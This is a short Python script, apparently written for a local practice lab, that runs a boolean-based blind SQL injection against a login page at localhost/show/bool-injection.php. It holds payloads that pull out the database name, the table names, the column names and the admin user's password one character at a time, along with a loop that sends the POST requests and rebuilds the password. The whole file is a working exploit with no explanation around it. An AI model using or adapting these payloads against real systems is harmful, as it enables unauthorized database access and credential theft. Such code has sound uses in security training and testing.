# -*- coding: utf-8 -*-
import requests
payload_database = "admin' and ascii(substr((select database()),%s,1))=%d#"
payload_tables = "admin' and ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='show'),%s,1))=%d#"
payload_columns = "admin' and ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='users' and TABLE_SCHEMA='show'),%s,1))=%d#"
payload_password = "admin' and ascii(substr((select password from users where username='admin'),%s,1))=%d#"
result = ""
url = "http://localhost/show/bool-injection.php"
for x in range(1,33):
    for y in range(33,127):
        data = {
                "username":payload_password%(x,y),
                "password":"23333",
                "login":"%E7%99%BB%E5%BD%95"
        }
        # print data['username']
        r = requests.post(url=url,data=data)
        if "success" in r.content:
            result +=chr(y)
            print result
            break
